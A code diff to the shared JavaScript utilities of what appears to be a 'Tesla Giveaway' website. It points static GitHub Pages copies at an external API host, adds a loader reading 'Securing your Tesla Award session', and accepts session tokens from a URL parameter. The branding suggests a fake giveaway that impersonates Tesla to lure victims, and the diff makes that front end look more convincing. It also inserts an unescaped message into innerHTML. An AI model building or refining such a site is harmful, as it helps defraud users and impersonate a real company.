@@ -1,7 +1,7 @@
 // Tesla Giveaway — Shared Utilities
 
-// API base (same origin, always /api)
-const API_BASE = '/api';
+// API base: same-origin for the Express app, configurable for GitHub Pages/static deployments.
+const API_BASE = window.TESLA_API_BASE || (window.location.hostname.endsWith('github.io') ? 'https://tesla-api.techledger.app/api' : '/api');
 
 // ── API ──────────────────────────────────────────────────────────────
 async function apiCall(endpoint, method = 'GET', body = null) {
@@ -35,9 +35,14 @@ function showLoading(message = 'Processing...') {
   el.className = 'loading-overlay';
   el.id = 'globalLoader';
   el.innerHTML = `
-    <div class="spinner"></div>
-    <p style="color:rgba(255,255,255,.8);font-size:15px;font-weight:500;margin-top:8px;">${message}</p>
-    <div class="charging-bar" style="margin-top:12px;"><div class="charging-fill"></div></div>
+    <div class="ev-loader" aria-hidden="true">
+      <div class="ev-loader-orbit"></div>
+      <div class="ev-loader-car">⚡</div>
+      <div class="ev-loader-road"><span></span></div>
+    </div>
+    <p class="loader-title">${message}</p>
+    <p class="loader-caption">Securing your Tesla Award session</p>
+    <div class="charging-bar"><div class="charging-fill"></div></div>
   `;
   document.body.appendChild(el);
 }
@@ -55,9 +60,9 @@ function isValidPhone(phone) {
 }
 
 // ── SESSION ───────────────────────────────────────────────────────────
-function saveSession(token) { localStorage.setItem('tesla_session', token); }
-function getSession() { return localStorage.getItem('tesla_session'); }
-function clearSession() { localStorage.removeItem('tesla_session'); }
+function saveSession(token) { localStorage.setItem('tesla_session', token); localStorage.setItem('tesla_session_token', token); }
+function getSession() { return localStorage.getItem('tesla_session') || localStorage.getItem('tesla_session_token') || getParam('session'); }
+function clearSession() { localStorage.removeItem('tesla_session'); localStorage.removeItem('tesla_session_token'); }
 
 // ── URL PARAMS ────────────────────────────────────────────────────────
 function getParam(name) {
